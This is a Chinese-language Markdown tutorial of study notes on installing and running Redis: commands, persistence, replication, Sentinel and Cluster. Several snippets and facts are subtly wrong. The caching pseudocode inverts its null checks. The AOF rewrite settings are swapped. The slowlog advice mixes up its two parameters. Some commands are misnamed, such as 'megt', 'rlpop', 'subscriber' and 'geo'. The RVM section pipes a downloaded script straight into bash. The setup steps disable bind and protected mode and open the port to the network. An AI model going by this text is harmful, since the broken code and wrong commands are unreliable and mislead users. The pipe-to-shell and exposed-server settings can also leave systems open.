---
sidebar: auto
---

## 介绍

#### Redis

## 环境安装

### Centos EPEL 仓库安装

- 安装 redis

```shell
yum install epel-release
yum update
yum install redis
```

- 启动

```shell
systemctl start redis
```

### 源码安装

- 安装基础依赖

```shell
yum install gcc
```

- 下载安装包

```shell
wget http://download.redis.io/releases/redis-5.0.7.tar.gz
```

- 解压到指定目录

```
tar xzf redis-5.0.7.tar.gz
mv ./redis-5.0.7 /usr/local/redis
cd /usr/local/redis/
```

- 编译

```shell
make
```

::: warning
出现报错 zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory
:::

```shell
make MALLOC=libc
```

::: warning
make[1]: \*\*\* [server.o] Error 1

make[1]: Leaving directory `/usr/local/redis/src'

make: \_\*\* [all] Error 2
:::

```shell
# 查看gcc版本是否在5.3以上，centos7.6默认安装4.8.5
gcc -v
# 升级gcc到5.3及以上
yum -y install centos-release-scl
yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils
scl enable devtoolset-9 bash
#需要注意的是scl命令启用只是临时的，退出shell或重启就会恢复原系统gcc版本。
#如果要长期使用gcc 9.3的话
echo "source /opt/rh/devtoolset-9/enable" >>/etc/profile
#这样退出shell重新打开就是新版的gcc了
#以下其他版本同理，修改devtoolset版本号即可
```

- 安装

```shell
make install
```

- 安装完成

```shell
cd /usr/local/bin/
ls -all
```

- 配置⽂件，移动到/etc/⽬录下

```
mkdir /etc/redis
cp /usr/local/redis/redis.conf /etc/redis/
```

### Redis 配置

```
vim /etc/redis/redis.conf
```

- 允许远程访问

```
bind 127.0.0.1
修改为
#bind 127.0.0.1
```

- 关闭保护功能

```
# protected-mode yes
修改为
protected-mode no
```

- 设置密码

```
# requirepass foobared
修改为
requirepass password(需要设置的密码)
```

- 进程在后台运行

```
daemonize no
修改为
daemonize yes
```

- 日志输出文件等信息

```
logfile ""
修改为指定的日志文件
logfile "/var/log/redis/6379.log"

#创建目录
mkdir /var/log/redis
```

- 开放端口

```
firewall-cmd --add-port=6379/tcp --permanent
#重新加载防火墙设置
firewall-cmd --reload
```

### Redis 开机启动

```
cat > /usr/lib/systemd/system/redis.service <<-EOF
[Unit]
Description=Redis persistent key-value database
After=network.target
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf --supervised systemd
ExecStop=/usr/local/bin/redis-cli shutdown
Type=notify
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF
# 使服务自动运行
systemctl daemon-reload
systemctl enable redis
# 启动服务
systemctl restart redis
systemctl status redis
```

### Docker 安装 Redis

#### 拉取镜像

```shell
#docker pull redis:latest
#docker pull redis:alpine
docker pull redis:3.2
```

#### 运行 Redis

```shell
#mkdir -p /home/data/redis
mkdir -p /home/docker/redis/{conf,data}
cd /home/docker/redis
#https://redis.io/topics/config
wget https://raw.githubusercontent.com/antirez/redis/3.2/redis.conf -O conf/redis.conf

docker run -d --privileged=true --restart=always -p 6379:6379 -v $PWD/conf/redis.conf:/etc/redis/redis.conf -v $PWD/data:/data --name redis redis:3.2 redis-server /etc/redis/redis.conf --appendonly yes
```

## 使用

### 通用命令

```shell
#遍历所有key
keys *
#计算key的总数
dbsize
#检查key是否存在
exists key
#删除指定key-value
del key [key ...]
#设置key在seconds秒后过期
expire key seconds
#查看key剩余的过期时间
ttl key
#去掉key的过期时间
persist key
#返回key的类型
type key
```

### 字符串

```shell
#获取key对应的value
get key
#设置key-value
set key value
#删除key-value
del key

#key自增1，如果key不存在，自增后get(key)=1
incr key
#key自减1，如果key不存在，自减后get(key)=-1
decr key
#key自增k，如果key不存在，自增后get(key)=k
incrby key k
#key自减k，如果key不存在，自减后get(key)=-k
decrby key k

#不管key是否存在，都设置
set key value
#key不存在，才设置
setnx key value
#key存在，才设置
set key value xx

##批量获取key
megt key1 key2 key3
#批量设置key-value
mset key1 value1 key2 value2 key3 value3

#set key newvalue并返回旧的value
set key newvalue
#将value追加到旧的value
append key value
#返回字符串的长度（注意中文）
strlen key

#增加key对应的值
incrbyfloat key value
#获取字符串指定下标所有的值
getrange key start end
#设置指定下标所有对应的值
setrange key index value
```

#### 实战

- 记录网站每个用户个人主页的访问量

```shell
incr userid:pageview
```

- 缓存视频的基本信息（数据源在 MySQL 中）伪代码

```
public VideoInfo get(long id) {
    String redisKey = redisPrefix + id;
    VideoInfo videoInfo = redis.get(redisKey);
    if (videoInfo != null) {
        redis.set(redisKey, serialize(videoInfo));
    }
    return videoInfo;
}
```

- 分布式 id 生成器

```shell
incr id
```

### 哈希

```shell
#获取hash key对应field的value
hget key field
#设置hash key对应field的value
hset key field value
#删除hash key对应field的value
hdel key field
#判断hash key是否有field
hexists key field
#获取hash key field的数量
hlen key
#批量获取hash key的一批field对应的值
hmget key field1 field2 ... fieldN
#批量设置hash key的一批field value
hmset key field1 value1 field2 value2...fieldN valueN

#返回hash key对应所有的field和value
hgetall key
#返回hash key对应所有field的value
hvals key
#返回hash key对应所有field
hkeys key

#设置hash key对应field的value(如field已经存在，则失败)
hsetnx key field value
#hash key对应的field的value自增intCount
hincrby key field intCount
#hincrby浮点数版
hincrbyfloat key field floatCount
```

#### 实战

- 记录网站每个用户个人主页的访问量

```shell
hincrby user:1:info pageview count
```

- 缓存视频的基本信息（数据源在 MySQL 中）伪代码

```
public VideoInfo get(long id) {
    String redisKey = redisPrefix + id;
    Map<String, String> hashMap = redis.hgetAll(redisKey);
    VideoInfo videoInfo = transferMapToVideo(hashMap);
    if (videoInfo == null) {
        videoInfo = mysql.get(id);
        if (videoInfo == null) {
            redis.hmset(redisKey, transferVideoToMap(videoInfo));
        }
    }
    return videoInfo;
}
```

### 列表

```shell
#从列表右端插入值（1-N个）
rpush key value1 value2 ...valueN
#从列表左端插入值（1-N个）
lpush key value1 value2 ...valueN
#在list指定的值前|后插入newValue
linsert key before|after value newValue
#从列表左侧弹出一个item
lpop key
#从列表右侧弹出一个item
rpop key
#根据count值，从列表中删除所有value相等的项
#(1)count>0，从左到右，删除最多count个value相等的项
#(2)count<0，从右到左，删除最多Math.abs(count)个value相等的项
#(3)count=0，删除所有value相等的项
lrem key count value
#按照索引范围修剪列表
ltrim key start end
#获取列表指定索引范围所有item
lrange key start end
#获取列表指定索引的item
lindex key index
#获取列表长度
llen key
#设置列表指定索引值为newValue
lset key index newValue

#lpop阻塞版本，timeout是阻塞超时时间，timeout=0永远不阻塞
blpop key timeout
#rpop阻塞版本，timeout是阻塞超时时间，timeout=0永远不阻塞
rlpop key timeout
```

#### 实战

- TimeLine

你关注的人更新微博，LPUSH

#### Tips

- LPUSH + LPOP = Stack
- LPUSH + RPOP = Queue
- LPUSH + LTRIM = Capped Collection
- LPUSH + BRPOP = Message Queue

### 集合

```shell
#向集合key添加element（如果element已经存在，添加失败）
sadd key element
#将集合key中的element移除掉
srem key element
#计算集合大小
scard key
#判断element是否在集合中
sismember key element
#从集合中随机挑count个元素
srandmember key count
#从集合中随机弹出一个元素
spop key
#获取集合所有元素
smembers key
#差集
sdiff key1 key2
#交集
sinter key1 key2
#并集
sunion key1 key2
#将差集、交集、并集结果保存到destkey
sdiff|sinter|sunion + store destkey
```

#### TIPS

- SADD = Tagging
- SPOP/SRANDMEMBER = Random item
- SADD + SINTER = Social Graph

### 有序集合

```shell
#添加score和element
zadd key score element
#删除元素
zrem key element
#返回元素的分数
zscore key element
#增加或减少元素的分数
zincrby key increScore element
#返回元素的总个数
zcard key
#返回元素的排名
zrank key element
#返回指定索引范围内的升序元素[分值]
zrange key start end [WITHSCORES]
#返回指定分数范围内的升序元素[分值]
zrangebyscore key minScore maxScore [WITHSCORES]
#返回有序集合内在指定分数范围内的个数
zcount key minScore maxScore
#删除指定排名内的升序元素
zremrangebyrank key start end
#删除指定分数内的升序元素
zremrangebyscore key minScore maxScore

zrevrank
zrevrange
zrevrangebyscore
zinterstore
zunionstore
```

#### 实战

- 排名榜

## 客户端

#### 参考：[https://redis.io/clients](https://redis.io/clients)

### Jedis

#### 参考：[https://github.com/xetorthio/jedis](https://github.com/xetorthio/jedis)

### redis-py

#### 参考：[https://github.com/andymccurdy/redis-py](https://github.com/andymccurdy/redis-py)

### redigo

#### 参考：

- [https://github.com/gomodule/redigo](https://github.com/gomodule/redigo)

- [https://godoc.org/github.com/gomodule/redigo/redis](https://godoc.org/github.com/gomodule/redigo/redis)

## 应用

### 慢查询

#### 生命周期

1. 发送命令
2. 排队
3. 执行命令
4. 返回结果

::: warning

慢查询发送在第 3 阶段

客户端超时不一定慢查询，但慢查询是客户端超时的一个可能因素
:::

#### 配置

- slowlog-max-len

1. 先进先出队列
2. 固定长度
3. 保存在内存内

- slowlog-log-slower-than

1. 慢查询阈值（单位：微秒）
2. slowlog-log-slower-than=0, 记录所有命令
3. slowlog-log-slower-than<0, 不记录任何命令

#### 配置方法

1. 默认值

- config get slowlog-max-len = 128
- config get slowlog-log-slower-than = 10000

2. 修改配置文件重启
3. 动态配置

- config set slowlog-max-len 1000
- config set slowlog-log-slower-than 1000

#### 命令

```shell
#获取慢查询队列
slowlog get [n]
#获取慢查询队列长度
slowlog len
#清空慢查询队列
slowlog reset
```

#### 运维经验

1. slowlog-max-len 不要设置过大，默认 10ms，通常设置 1ms
2. slowlog-log-slower-than 不要设置过小，通常设置 1000 左右
3. 理解命令生命周期
4. 定期持久化慢查询

### pipeline

流水线

::: warning

注意每次 pipeline 携带数据量

pipeline 每次只能作用在一个 Redis 节点上

M 操作与 pipeline 区别
:::

### 发布订阅

#### 角色

- 发布者(publisher)

- 订阅者(subscriber)

- 频道(channel)

#### 模型

#### 命令

```shell
#publisher
publish channel message
#subscriber 一个或多个
subscriber [channel]
#unsubscriber 一个或多个
unsubscriber [channel]

#订阅模式
psubscriber [pattern...]
#退订指定的模式
punsubscriber [pattern...]
#列出至少有一个订阅者的频道
pubsub channels
#列出给定频道的订阅者数量
pubsub numsub [channel...]
```

#### 消息队列

### bitmap

#### 位图

#### 命令

```shell
#给位图指定索引设置值
setbit key offset value
#获取位图指定索引的值
getbit key offset
#获取位图指定范围(start到end，单位为字节，如果不指定就是获取全部)位值为1的个数
bitcount key [key end]
#做多个Bitmap的and(交集)、or(并集)、not(非)、xor(异或)操作并将结果保存在destkey中
bitop op destkey key [key...]
#计算位图指定范围(start到end，单位为字节，如果不指定就是获取全部)第一个偏移量对应的值等于targetBit的位置
bitpos key targetBit [start] [end]
```

#### 独立用户统计

1. 使用 set 和 Bitmap
2. 1 亿用户，5 千万独立

| 数据类型 |                  每个 userid 占用空间                   | 需要存储的用户量 |         全部内存量         |
| :------: | :-----------------------------------------------------: | :--------------: | :------------------------: |
|   set    | 32 位(假设 userid 用的是整型，实际很多网站用的是长整型) |     1000000      |   32 位 \* 1000000 = 4MB   |
|  Bitmap  |                          1 位                           |    100000000     | 1 位 \* 100000000 = 12.5MB |

::: warning
type=string，最大 512MB

注意 setbit 时的偏移量，可能有较大耗时

位图不是绝对好
:::

### hyperloglog

基于 HyperLogLog 算法：极小空间完成独立数量统计。本质还是字符串。

#### 命令

```shell
#向hyperloglog添加元素
pfadd key element [element ...]
#计算hyperloglog的独立总数
pfcount key [key ...]
#合并多个hyperloglog
pfmerge destkey sourcekey [sourcekey ...]
```

### geo

GEO(地理信息定位)：存储经纬度，计算两地距离，范围计算等

#### 命令

```shell
#增加地理位置信息
geo key longitude latitude member [longitude latitude member ...]
#获取地理位置信息
geopos key member [member ...]
#获取两个地理位置的距离
#unit: m(米) km(千米) mi(英里) ft(尺)
geodist key member1 member2 [unit]
#获取指定位置范围内的地理位置信息集合
#withcoord：返回结果中包含经纬度
#withdist：返回结果中包含距离中心节点位置
#withhash：返回结果中包含geohash
#COUNT count：指定返回结果的数量
#asc|desc：返回结果按照距离中心节点的距离做升序或者降序
#store key：将返回结果的地理位置信息保存到指定键
#storedist key：将返回结果距离中心节点的距离保存到指定键
georadius key longitude latitude radiusm|km|ft|mi [withcoord] [withdist] [withhash] [COUNT count] [asc|desc] [store key][storedist key]

georadiusbymember key member radiusm|km|ft|mi [withcoord] [withdist] [withhash] [COUNT count] [asc|desc] [store key][storedist key]
```

## 持久化

redis 所有数据保存在内存中，对数据的更新将异步地保存在磁盘上

### RDB

#### 触发机制

- save(同步)
- bgsave(异步)
- 自动

#### 配置

```
save 900 1
save 300 10
save 60 10000
dbfilename dump-${port}.rdb
dir /bigdiskpath
stop-writes-on-bgsave-err yes
rdbcompression yes
rdbchecksum yes
```

#### 触发机制-不可忽略方式

1. 全量复制
2. debug reload
3. shutdown

#### 总结

1. RDB 是 Redis 内存到硬盘的快照，用于持久化
2. save 通常会阻塞 Redis
3. bgsave 不会阻塞 Redis，但是会 fork 新进程
4. save 自动配置满足任一就会被执行
5. 有些触发机制不容忽视

### AOF

#### 策略

- always
- everysec
- no

#### AOF 重写作用

- 减少硬盘占有量
- 加速恢复速度

#### AOF 重写两种方式

- bgrewriteaof
- AOF 重写配置

#### AOF 重写配置

- 配置

```
#AOD重写需要的尺寸
auto-aof-rewrite-min-size
#AOF文件增长率
auto-aof-rewrite-percentage
```

- 统计

```
#AOF当前尺寸(单位：字节)
aof_current_size
#AOF上次启动和重写的尺寸(单位：字节)
aof_base_size
```

#### 自动触发时机

- aof_current_size > auto-aof-rewrite-min-size
- aof_current_size - aof_base_size / aof_base_size > auto-aof-rewrite-percentage

#### 配置

```
appendonly yes
appendfilename "appendonly-${port}.aof"
appendfsync everysec
dir /bigdiskpath
no-appendfsync-on-rewrite yes
auto-aof-rewrite-min-size 100
auto-aof-rewrite-percentage 64mb
```

### RDB 和 AOF 选择

#### RDB 最佳策略

- "关"
- 集中管理
- 主从，从开

#### AOF 最佳策略

- "开"：缓存和存储
- AOF 重写集中管理
- everysec

#### 最佳策略

- 小分片
- 缓存或者存储
- 监控(硬盘、内存、负载、网络)
- 足够内存

### 常见问题

#### fork 操作

1. 同步操作
2. 与内存量息息相关：内存越大，耗时越长(与机器类型有关)
3. info:latest_fork_usec

#### 改善 fork

1. 优先使用物理机或者高效支持 fork 操作的虚拟化技术
2. 控制 Redis 实例最大可用内存：maxmemory
3. 合理配置 Linux 内存分配策略：vm.overcommit_memory=1
4. 降低 fork 频率：例如放宽 AOF 重写自动触发时机，不必要的全量复制

#### 子进程开销和优化

1. CPU

- 开销：RDB 和 AOF 文件生成，属于 CPU 密集型
- 优化：不做 CPU 绑定，不和 CPU 密集型部署

2. 内存

- 开销：fork 内存开销，copy-on-write
- 优化：echo never > /sys/kernel/mm/transparent_hugepage/enabled

3. 硬盘

- 开销：AOF 和 RDB 文件写入，可以结合 iostat,iotop 分析
- 优化：
  - 不要和高硬盘负载服务部署一起：存储服务、消息队列等
  - no-appendfsync-on-rewrite = yes
  - 根据写入量决定磁盘类型：例如 ssd
  - 单机多实例持久化文件目录可以考虑分盘

#### AOF 阻塞定位

- Redis 日志：Asynchronous AOF fsync is taking too long (disk is busy?). Writing the AOF buffer without waiting for fsync to complete, this may slow down Redis.
- `info persistence`
- `top`

## 主从复制

1. 一个 master 可以有多个 slave
2. 一个 slave 只能有一个 master
3. 数据流向是单向的，master 到 slave

### 主从复制配置

- slaveof 命令

```shell
slaveof 127.0.0.1 6379
#取消复制
slaveof no one
```

- 修改配置

```shell
slaveof ip port
slave-read-only yes
```

### 全量复制开销

1. bgsave 时间
2. RDB 文件网络传输时间
3. 从节点清空数据时间
4. 从节点加载 RDB 的时间
5. 可能的 AOF 重写时间

### 常见问题

#### 读写分离

读流量分摊到从节点

- 复制数据延迟
- 读到过期数据
- 从节点故障

#### 配置不一致

- 例如 maxmemory 不一致：丢失数据
- 例如数据结构优化参数(例如 hash-max-ziplist-entries)：内存不一致

#### 规避全量复制

1. 第一次全量复制

- 第一次不可避免
- 小主节点、低峰

2. 节点运行 ID 不匹配

- 主节点重启(运行 ID 变化)
- 故障转移，例如哨兵或集群

3. 复制积压缓冲区不足

- 网络中断，部分复制无法满足
- 增大复制缓冲区配置 rel_backlog_size，网络"增强"

#### 规避复制风暴

1. 单节点复制风暴

- 问题：主节点重启，多从节点复制
- 解决：更换复制拓扑

1. 单机器复制风暴

- 机器宕机后，大量全量复制
- 主节点分数多机器

## Redis Sentinel

### Redis Sentinel 故障转移

1. 多个 sentinel 发现并确认 master 有问题
2. 选举出一个 sentinel 作为领导
3. 选出一个 slave 作为 master
4. 通知其余 slave 成为新的 master 的 slave
5. 通知客户端主从变化

### 安装与配置

1. 配置开启主从节点
2. 配置开启 sentinel 监控主节点(sentinel 是特殊的 redis)
3. 实际应该多机器
4. 详细配置节点

#### Master

- 启动

```shell
redis-server redis-7000.conf
```

- 配置

```shell
port 7000
daemonize yes
pidfile /var/run/redis-7000.pid
logfile "7000.log"
dir "/usr/local/redis/data/"
```

#### Slave

- 启动

```shell
redis-server redis-7001.conf
redis-server redis-7002.conf
```

- 配置

```shell
#slave-1
port 7001
daemonize yes
pidfile /var/run/redis-7001.pid
logfile "7001.log"
dir "/usr/local/redis/data/"
slaveof 127.0.0.1 7000
#slave-2
port 7002
daemonize yes
pidfile /var/run/redis-7002.pid
logfile "7002.log"
dir "/usr/local/redis/data/"
slaveof 127.0.0.1 7000
```

#### sentinel 主要配置

```shell
vim redis-sentinel-26379.conf

port 26379
daemonize yes
dir "/usr/local/redis/data/"
logfile "26379.log"
sentinel monitor mymaster 127.0.0.1 7000 2
sentinel down-after-milliseconds mymaster 30000
sentinel parallel-syncs mymaster 1
sentinel failover-timeout mymaster 180000


vim redis-sentinel-26380.conf

port 26380
daemonize yes
dir "/usr/local/redis/data/"
logfile "26380.log"
sentinel monitor mymaster 127.0.0.1 7000 2
sentinel down-after-milliseconds mymaster 30000
sentinel parallel-syncs mymaster 1
sentinel failover-timeout mymaster 180000


vim redis-sentinel-26381.conf

port 26381
daemonize yes
dir "/usr/local/redis/data/"
logfile "26381.log"
sentinel monitor mymaster 127.0.0.1 7000 2
sentinel down-after-milliseconds mymaster 30000
sentinel parallel-syncs mymaster 1
sentinel failover-timeout mymaster 180000
#启动
redis-sentinel redis-sentinel-26379.conf
redis-sentinel redis-sentinel-26380.conf
redis-sentinel redis-sentinel-26381.conf

port ${port}
daemonize yes
dir "/usr/local/redis/data/"
logfile "${port}.log"
sentinel monitor mymaster 127.0.0.1 7000 2
sentinel down-after-milliseconds mymaster 30000
sentinel parallel-syncs mymaster 1
sentinel failover-timeout mymaster 180000
```

### 故障转移

- 从 slave 节点中选出一个"合适的"节点作为新的 master
- 对上面的 slave 节点执行`slaveof no one`命令让其成为 master 节点
- 向剩余的 slave 节点发送命令，让他们成为新 master 节点的 slave 节点，复制规则和 parallel-syncs 参数有关
- 更新对原来 master 节点配置为 slave，并保持着对其"关注"，当其恢复后命令他去复制新的 master 节点

#### 选择"合适的"节点

- 选择`slave-priority`(slave 节点优先级)最高的 slave 节点，如果存在则返回，不存在则继续
- 选择复制偏移量最大的 slave 节点(复制的最完整)，如果存在则返回，不存在则继续
- 选择 runID 最小的 slave 节点

### 常见问题

#### 节点运维

- 机器下线：例如过保等情况
- 机器性能不足：例如 CPU、内存、硬盘、网络等
- 节点自身故障：例如服务不稳定等

主节点： `sentinel failover <masterName></masterName>`

从节点：临时下线还是永久下线，例如是否做一些清理工作。但是要考虑读写分离的情况

Sentinel 节点：同上

#### 节点上线

主节点： `sentinel failover`进行替换

从节点：`slaveof`即可，sentinel 节点可以感知

Sentinel 节点：参考其他 sentinel 节点启动即可

#### 高可用读写分离

#### 从节点对作用

- 副本：高可用的基础
- 扩展：读能力

#### 三个"消息"

- +switch-master：切换主节点(从节点晋升主节点)
- +conver-to-slave：切换从节点(原主节点降为从节点)
- sdown：主观下线

## Redis Cluster

### 集群

1. 并发量
2. 数据量

### 数据分布

| 分布方式 |                                特点                                 |                          典型产品                          |
| :------: | :-----------------------------------------------------------------: | :--------------------------------------------------------: |
| 哈希分布 | 数据分散度高 <br>键值分布业务无关 <br>无法顺序访问 <br>支持批量操作 | 一致性哈希 <br>Memcache <br>Redis Cluster <br>其他缓存产品 |
| 顺序分布 |   数据分散度倾斜 <br>键值业务相关 <br>可顺序访问 <br>支持批量操作   |                     BigTable <br>HBase                     |

#### 顺序分布

#### 哈希分布(例如节点取模)

- 节点取余分区
  - 节点取余：hash(key)%nodes
    - 客户端分片：哈希 + 取余
    - 节点伸缩：数据节点关系变化，导致数据迁移
    - 迁移数量和添加节点数量有关：建议翻倍扩容
- 一致性哈希分区
  - 客户端分片：哈希 + 顺时针(优化取余)
  - 节点伸缩：只影响邻近节点，但是还是有数据迁移
  - 翻倍伸缩：保证最小迁移数据和负载均衡
- 虚拟槽分区 CRC16(key) & 16383
  - 预设虚拟槽：每个槽映射一个数据子集，一般比节点大
  - 良好的哈希函数：例如 CRC16
  - 服务端管理节点、槽、数据：例如 Redis Cluster

### 安装

#### 原生命令安装

Cluster 节点主要配置

```shell
cluster-enabled yes
cluster-node-timeout 15000
cluster-config-file nodes.conf
cluster-require-full-coverage yes
```

Cluster 常用命令

```shell
redis-cli -c -p 7000
cluster info
cluster nodes
cluster slots
```

1. 配置开启节点

```shell
#配置开启Redis
port ${port}
daemonize yes
dir "/usr/local/redis/data/"
dbfilename "dump-${port}.rdb"
logfile "${port}.log"
cluster-enabled yes
cluster-config-file nodes-${port}.conf
cluster-require-full-coverage no

mkdir /usr/local/redis/config
mkdir /usr/local/redis/data
cd /usr/local/redis/config
cat redis-7000.conf

port 7000
daemonize yes
dir "/usr/local/redis/data/"
dbfilename "dump-7000.rdb"
logfile "7000.log"
cluster-enabled yes
cluster-config-file nodes-7000.conf
cluster-require-full-coverage no

sed 's/7000/7001/g' redis-7000.conf > redis-7001.conf
sed 's/7000/7002/g' redis-7000.conf > redis-7002.conf
sed 's/7000/7003/g' redis-7000.conf > redis-7003.conf
sed 's/7000/7004/g' redis-7000.conf > redis-7004.conf
sed 's/7000/7005/g' redis-7000.conf > redis-7005.conf

redis-server redis-7000.conf
redis-server redis-7001.conf
redis-server redis-7002.conf
redis-server redis-7003.conf
redis-server redis-7004.conf
redis-server redis-7005.conf
```

2. meet

```shell
#cluster meet ip port
redis-cli -h 127.0.0.1 -p 7000 cluster meet 127.0.0.1 7001
redis-cli -h 127.0.0.1 -p 7000 cluster meet 127.0.0.1 7002
redis-cli -h 127.0.0.1 -p 7000 cluster meet 127.0.0.1 7003
redis-cli -h 127.0.0.1 -p 7000 cluster meet 127.0.0.1 7004
redis-cli -h 127.0.0.1 -p 7000 cluster meet 127.0.0.1 7005
```

3. 指派槽

```shell
mkdir script
cd script/
cat addslots.sh

start=$1
end=$2
port=$3
for slot in `seq ${start} ${end}`
do
  echo "slot:${slot}"
  redis-cli -p ${port} cluster addslots ${slot}
done

sh addslots.sh 0 5461 7000
sh addslots.sh 5462 10922 7001
sh addslots.sh 10923 16383 7002
```

4. 主从

```shell
#cluster replicate node-id
cluster nodes
redis-cli -h 127.0.0.1  -p 7003 cluster replicate ${node-id-7000}
redis-cli -h 127.0.0.1  -p 7004 cluster replicate ${node-id-7001}
redis-cli -h 127.0.0.1  -p 7005 cluster replicate ${node-id-7002}
```

#### 官方工具安装

::: warning
Redis Cluster 在 5.0 之后取消了 ruby 脚本 redis-trib.rb 的支持（手动命令行添加集群的方式不变），集合到 redis-cli 里，避免了再安装 ruby 的相关环境

All commands and features belonging to redis-trib.rb have been moved to redis-cli
:::

```shell
redis-cli --cluster create --cluster-replicas 1 127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005
```

#### 以下为 Redis Cluster 5.0 之前的安装方式

1. 安装 Ruby 环境

RVM 安装

```shell
#安装GPG keys
gpg2 --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB
#安装 RVM
curl -sSL https://get.rvm.io | bash -s stable
#载入RVM环境
source /etc/profile.d/rvm.sh
#检查RVM是否安装好
rvm -v
gem -v
#列出已知的ruby版本
rvm list known
#选择现有的rvm版本来进行安装
rvm install 2.7
#查询已安装的ruby
rvm list
#卸载已安装的版本
rvm remove [版本号]
#设置Ruby版本
rvm 2.0.0 —default
#更换Ruby源
gem sources
gem sources -a http://mirrors.aliyun.com/rubygems/
gem sources -r https://rubygems.org/
gem sources -u
```

源码安装

```shell
yum install zlib-devel openssl-devel
#下载ruby
wget https://cache.ruby-lang.org/pub/ruby/2.3/ruby-2.7.1.tar.gz
#安装ruby
tar -xvf ruby-2.7.1.tar.gz
cd ruby-2.7.1
./configure --prefix=/usr/local/ruby  --disable-install-rdoc
make
make install
ruby -v
cd /usr/local/ruby
cp bin/ruby /usr/local/bin
cp bin/gem /usr/local/bin
```

::: warning
出现报错
Directory .ext/rdoc already exists, but it looks like it isn't an RDoc directory.
:::

```shell
#不安装rdoc
./configure --disable-install-rdoc
```

2. 安装 redis

```shell
gem install redis
```

```shell
#安装rubygem redis
wget https://rubygems.org/downloads/redis-4.1.4.gem
gem install -l redis-4.1.4.gem
gem list --check redis gem
```

3. 安装 redis-trib.rb

```shell
#cp ${REDIS_HOME}/src/redis-trib.rb /usr/local/bin
find / -name redis-trib.rb
cp /usr/local/redis/src/redis-trib.rb /usr/local/bin
```

4. 构建集群

```shell
./redis-trib.rb create --replicas 1 127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005
```

### 扩容集群

1. 准备新节点

- 集群模式
- 配置和其他节点统一
- 启动后是孤儿节点

```shell
sed 's/7000/7006/g' redis-7000.conf > redis-7006.conf
sed 's/7000/7007/g' redis-7000.conf > redis-7007.conf
redis-server redis-7006.conf
redis-server redis-7007.conf
```

2. 加入集群

```shell
redis-cli -p 7000 cluster meet 127.0.0.1 7006
redis-cli -p 7000 cluster meet 127.0.0.1 7007
redis-cli -p 7007 cluster replicate  ${node-id-7006}

#加入集群-redis-trib.rb
#redis-trib.rb add-node new_host:new_port existing_host:existing_port --slave --master-id <arg>
#redis-trib.rb add-node 127.0.0.1:7006 127.0.0.1:7000
```

作用

- 为他迁移槽和数据实现扩容
- 作为从节点负责故障转移

3. 迁移槽和数据

```shell
#Redis Cluster 5.0 之后使用
redis-cli --cluster reshard 127.0.0.1:7000

#Redis Cluster 5.0 之前使用
#redis-trib
redis-trib.rb reshard 127.0.0.1:7000
4096
${node-id-7006}
all
yes
```

- 槽迁移计划
- 迁移数据
- 添加从节点

#### 迁移数据

1. 对目标节点发送：`cluster setslot {slot} importing {sourceNodeId}`命令，让目标节点准备导入槽的数据
2. 对源节点发送：`cluster setslot {slot} migrating {targetNodeId}`命令，让源节点准备迁出槽的数据
3. 源节点循环执行`cluster getkeysinslot {slot} {count}`命令，每次获取 count 个属于槽的键
4. 在源节点上执行`migrate {targetIp} {targetPort} key 0 {timeout}`命令把指定 key 迁移
5. 重复执行步骤 3-4 直到槽下所有数据迁移到目标节点
6. 向集群内所有主节点发送`cluster setslot {slot} node {targetNodeId}`命令，通知槽分配给目标节点

### 收缩集群

- 下线迁移槽
- 忘记节点
- 关闭节点

Redis Cluster 5.0 之后使用

```shell
redis-cli --cluster reshard --cluster-from ${node-id-7006} --cluster-to ${node-id-7000} --cluster-slots 1365 127.0.0.1:7006
redis-cli --cluster reshard --cluster-from ${node-id-7006} --cluster-to ${node-id-7001} --cluster-slots 1366 127.0.0.1:7006
redis-cli --cluster reshard --cluster-from ${node-id-7006} --cluster-to ${node-id-7002} --cluster-slots 1365 127.0.0.1:7006

#cluster forget {downNodeId}
redis-cli --cluster del-node 127.0.0.1:7000 ${node-id-7007}
redis-cli --cluster del-node 127.0.0.1:7000 ${node-id-7006}
```

Redis Cluster 5.0 之前使用

```shell
#redis-trib
redis-trib.rb reshard --from ${node-id-7006} --to ${node-id-7000} --slots 1365 127.0.0.1:7006
redis-trib.rb reshard --from ${node-id-7006} --to ${node-id-7001} --slots 1366 127.0.0.1:7006
redis-trib.rb reshard --from ${node-id-7006} --to ${node-id-7002} --slots 1365 127.0.0.1:7006

#cluster forget {downNodeId}
redis-trib.rb del-node 127.0.0.1:7000 ${node-id-7007}
redis-trib.rb del-node 127.0.0.1:7000 ${node-id-7006}
```

### 客户端路由

#### moved 重定向

```shell
redis-cli -c -p 7000
cluster keyslot key
```

#### ask 重定向

#### smart 客户端

1. 从集群中选一个可运行节点，使用`cluster slots`初始化槽和节点映射
2. 将`cluster slots`的结果映射到本地，为每个节点创建 JedisPool
3. 准备执行命令

#### 批量操作优化

1. 串行 mget
2. 串行 IO
3. 并行 IO
4. hash_tag
   | 方案 | 优点 | 缺点 | 网络 IO |
   | :-------------: | :----------------------------------------------: | :---------------------: | :--------------------: |
   | 串行 mget | 编程简单 <br> 少量 keys 满足需求| 大量 keys 请求延迟严重| O(keys)|
   | 串行 IO | 编程简单 <br> 少量节点满足需求 |大量 node 延迟严重 | O(nodes)|
   | 并行 IO | 采用并行特性<br> 延迟取决于最慢的节点 |编程复杂<br>超时定位问题难 | O(max_slow(node))|
   | hash_tag | 性能最高|读写增加 tag 维护成本 tag 分布易出现数据倾斜 | O(1)|

### 故障

#### 故障发现

- 通过 ping/pong 消息实现故障发现：不需要 sentinel
- 主观下线和客观下线

#### 主观下线

某个节点认为另一个节点不可用，"偏见"

#### 客观下线

当半数以上持有槽的主节点都标记某节点主观下线

#### 尝试客观下线

- 通知集群内所有节点标记故障节点为客观下线
- 通知故障节点的从节点触发故障转移流程

#### 故障恢复

- 资格检查

  - 每个从节点检查与故障主节点的断线时间
  - 超过 cluster-node-timeout \* cluster-slave-validity-factor 取消资格
  - cluster-slave-validity-factor:默认是 10

- 准备选举时间
- 选举投票
- 替换主节点
  - 当前从节点取消复制变为主节点`slaveof no one`
